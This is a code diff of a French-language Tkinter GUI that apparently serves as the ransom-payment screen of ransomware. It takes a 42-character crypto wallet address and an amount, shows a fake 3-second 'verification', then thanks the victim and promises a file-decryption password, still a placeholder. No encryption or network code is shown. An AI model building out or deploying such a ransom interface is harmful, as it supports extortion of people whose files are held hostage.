@@ -34,7 +34,7 @@ def show_form_frame(paymentFrame, formFrame):
     formFrame.grid(row=0, column=0, padx=100, pady=100)
 
 
-def submit_form(root, name_entry, surname_entry, wallet_adress_entry, amount_entry, formFrame, loadingFrame, successFrame, confirmation_label):
+def submit_form(root, name_entry, surname_entry, wallet_adress_entry, amount_entry, formFrame, loadingFrame, successFrame, confirmation_label, logo):
     if len(wallet_adress_entry.get()) != 42:
         confirmation_label.config(text=f"Votre adresse de portefeuille est incorrect !\nVérifiez qu'il contient bien 42 caractères.\nIl y a actuellement {len(wallet_adress_entry.get())} caractères")
     elif amount_entry.get() < "1":
@@ -46,15 +46,20 @@ def submit_form(root, name_entry, surname_entry, wallet_adress_entry, amount_ent
 
         # Simuler un délai de "vérification" (par exemple, 3 secondes)
         # Après 3 secondes, appeler show_success
-        root.after(3000, lambda: show_success(name_entry, surname_entry, loadingFrame, successFrame))  
+        root.after(3000, lambda: show_success(name_entry, surname_entry, loadingFrame, successFrame, logo))  
 
-def show_success(name_entry, surname_entry, loadingFrame, successFrame):
+def show_success(name_entry, surname_entry, loadingFrame, successFrame, logo):
     loadingFrame.grid_forget()
-    
-    Label(successFrame, text="Bravo!\nLa transaction a été validée.", fg="green", bg="white").grid(column=0, row=0)
-    Label(successFrame, text=f"Merci {surname_entry.get()} {name_entry.get()} pour ta contribution !", bg="white").grid(column=0, row=1)
-    Label(successFrame, text=f"Comme promis, voici le mot de passe qui te permettra de decrypter tes fichiers :", bg="white").grid(column=0, row=3)
-    Label(successFrame, text=f"INSERER MOT DE PASSE", bg="white").grid(column=0, row=4)
+
+    img_label = Label(successFrame, image=logo, bg="white")
+    img_label.image = logo
+    img_label.grid(row=0, column=0, columnspan=2)
+    Label(successFrame, text="LessiDoidlam1\n", bg="white").grid(column=0, row=1)
+
+    Label(successFrame, text="Bravo!\nLa transaction a été validée.", fg="green", bg="white").grid(column=0, row=2)
+    Label(successFrame, text=f"Merci {surname_entry.get()} {name_entry.get()} pour ta contribution !", bg="white").grid(column=0, row=3)
+    Label(successFrame, text=f"Comme promis, voici le mot de passe qui te permettra de decrypter tes fichiers :", bg="white").grid(column=0, row=4)
+    Label(successFrame, text=f"INSERER MOT DE PASSE", bg="white").grid(column=0, row=5)
 
     # Afficher la frame de succès
     successFrame.grid(row=0, column=0, padx=100, pady=100)
